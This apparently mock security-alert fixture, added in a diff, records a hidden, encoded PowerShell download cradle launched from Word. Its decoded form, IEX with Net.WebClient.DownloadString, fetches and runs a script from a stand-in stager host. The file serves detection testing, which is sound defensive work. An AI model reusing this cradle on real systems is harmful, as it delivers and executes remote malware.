@@ -1,0 +1,30 @@
+{
+  "id": "1727674560.20005",
+  "timestamp": "2026-09-30T05:36:00.000+0000",
+  "rule": {
+    "id": "100300",
+    "level": 12,
+    "description": "PowerShell executed hidden with an encoded command (download cradle)",
+    "groups": ["windows", "sysmon", "powershell", "vigix_custom"],
+    "firedtimes": 1,
+    "mitre": { "id": ["T1059.001"], "tactic": ["Execution"], "technique": ["PowerShell"] }
+  },
+  "agent": { "id": "019", "name": "WKS-HR-03", "ip": "10.0.5.19" },
+  "manager": { "name": "wazuh-manager" },
+  "decoder": { "name": "windows_eventchannel" },
+  "location": "EventChannel",
+  "data": {
+    "url": "http://vigix-mock-stager.net/a.ps1",
+    "dns": { "question": { "name": "vigix-mock-stager.net" } },
+    "win": {
+      "system": { "eventID": "1", "channel": "Microsoft-Windows-Sysmon/Operational" },
+      "eventdata": {
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "commandLine": "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgBpAGcAaQB4AC0AbQBvAGMAawAtAHMAdABhAGcAZQByAC4AbgBlAHQALwBhAC4AcABzADEAJwApAA==",
+        "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "user": "CORP\\hr.clerk"
+      }
+    }
+  },
+  "full_log": "Process create: powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgBpAGcAaQB4AC0AbQBvAGMAawAtAHMAdABhAGcAZQByAC4AbgBlAHQALwBhAC4AcABzADEAJwApAA== parent WINWORD.EXE user CORP\\hr.clerk decoded: IEX (New-Object Net.WebClient).DownloadString('http://vigix-mock-stager.net/a.ps1')"
+}
